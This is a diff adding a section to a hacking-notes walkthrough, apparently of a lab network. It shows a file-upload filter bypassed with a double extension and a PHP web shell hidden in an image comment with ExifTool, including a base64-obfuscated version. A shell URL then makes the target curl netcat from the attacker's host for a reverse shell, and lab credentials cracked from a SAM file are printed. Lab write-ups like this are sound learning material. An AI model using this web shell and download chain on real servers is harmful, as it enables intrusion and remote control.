@@ -273,3 +273,79 @@ Info: Download successful!
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/c9225d33-913a-4cc2-ba56-14e162925fa4)
 
+- On navigating to the directory **2-345ac8b236064b431fa43f53d91c98c4834ef8f3** I found the `index.php` file under the resources folder.
+- Upon analysing the file I get to know that there is a filter bypassing there with only extensions jpeg, jpg png and gif allowed.
+```php
+$target = "uploads/".basename($_FILES["file"]["name"]);
+		$goodExts = ["jpg", "jpeg", "png", "gif"];
+		if(file_exists($target)){
+			header("location: ./?msg=Exists");
+			die();
+		}
+```
+- With more analysis, the uploaded images are stored in the `/uploads` directory.
+- Next, I navigate to `http://10.200.96.100/resources` and I got a login screen with credentials to enter.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/9c29a35c-6dc7-449b-8d96-950cd2b803ff)
+
+- I use credentials that I cracked earlier in the SAM file and got login successfully.
+```bash
+Username = Thomas
+Password = i<3ruby
+```
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3e0f7b29-1c8d-4e7a-94a0-788f208b2d9c)
+
+- On trying to upload a basic jpeg file I got the file uploaded successfully.
+- Next, I tried altering the extension of the file to `image.jpeg.php` and it is successful.
+- Now, I insert a simple PHP payload into the `jpeg.php` file by using `ExifTool` to see if it works.
+```bash
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" image.jpeg.php
+
+
+ exiftool image.jpeg.php
+                                                               
+ExifTool Version Number         : 12.64
+File Name                       : image.jpeg.php
+Directory                       : .
+File Size                       : 5.5 kB
+-----------------------_SNIP----------------------
+Color Transform                 : YCbCr
+Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+Image Width                     : 600
+Image Height                    : 400
+```
+- I uploaded the image and navigate the image that we uploaded I get the output of cmd.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/32d47f3a-3360-4610-a944-759c4e607e9f)
+
+- So, here our php command works perfectly. Next, I again upload a php malicious command with which we can able to extract information from the system. I need to obfuscate the command to make it work perfectly.
+```bash
+Command:
+
+<?php
+    $cmd = $_GET["command"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+
+
+Encoded command: 
+# With escaping $ sign with \
+
+<?php \$f0=\$_GET[base64_decode('Y29tbWFuZA==')];if(isset(\$f0)){echo base64_decode('PHByZT4=').shell_exec(\$f0).base64_decode('PC9wcmU+');}die();?>
+```
+- Inserted the command in the image comment using the same ExifTool as we used before.
+```bash
+ exiftool -Comment="<?php \$f0=\$_GET[base64_decode('Y29tbWFuZA==')];if(isset(\$f0)){echo base64_decode('PHByZT4=').shell_exec(\$f0).base64_decode('PC9wcmU+');}die();?>" img.jpeg.php 
+```
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/4a190827-9c63-4c9f-8417-586b48064a84)
+
+- It works perfectly, next, I need to get a reverse shell on my system for this I upload a netcat to the target and execute it.
+```bash
+http://10.200.96.100/resources/uploads/imag.jpeg.php?command=curl%20http://10.50.76.115:800/nc64.exe%20-o%20C:\\Windows\\temp\\nc.exe
+```
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/61aa5658-5fc8-4e8c-a774-9d7440c2182f)
+
